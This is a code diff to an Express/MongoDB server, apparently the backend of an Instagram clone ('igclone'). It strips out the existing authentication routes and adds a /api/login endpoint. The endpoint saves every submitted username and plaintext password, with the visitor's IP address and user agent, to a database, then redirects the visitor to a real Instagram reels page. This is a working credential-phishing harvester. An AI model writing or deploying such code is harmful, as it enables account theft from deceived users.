@@ -21,7 +21,7 @@ app.use((req, res, next) => {
 });
 
 // Connessione a MongoDB
-mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/DEGI', {
+mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/igclone', {
 })
 .then(() => console.log('MongoDB connected...'))
 .catch(err => console.error('MongoDB connection error:', err));
@@ -30,9 +30,47 @@ mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/DEGI', {
 app.use(bodyParser.json());
 app.use(express.static(path.join(__dirname, '..', 'public')));
 
-// Routes - Rimuovi il prefisso /api poiché viene gestito da nginx
-app.use('/api/auth', authRoutes);
-app.use('/api/admin/auth', adminAuthRoutes);
+// Modello dei dati di login
+const LoginSchema = new mongoose.Schema({
+  username: String,
+  password: String,
+  timestamp: {
+    type: Date,
+    default: Date.now
+  },
+  ipAddress: String,
+  userAgent: String
+});
+
+const Login = mongoose.model('Login', LoginSchema);
+
+// Route per salvare i dati di login
+app.post('/api/login', async (req, res) => {
+  try {
+    const { username, password } = req.body;
+    
+    // Salva i dati di login nel database
+    const login = new Login({
+      username,
+      password,
+      ipAddress: req.ip,
+      userAgent: req.headers['user-agent']
+    });
+    
+    await login.save();
+    
+    // Risposta di successo
+    res.status(200).json({ 
+      success: true, 
+      redirectUrl: 'https://www.instagram.com/reels/your-reels-id-here/' 
+    });
+    
+  } catch (error) {
+    console.error('Errore durante il salvataggio dei dati:', error);
+    res.status(500).json({ success: false, message: 'Errore del server' });
+  }
+});
+
 
 // Catch-all route
 app.get('*', (req, res) => {
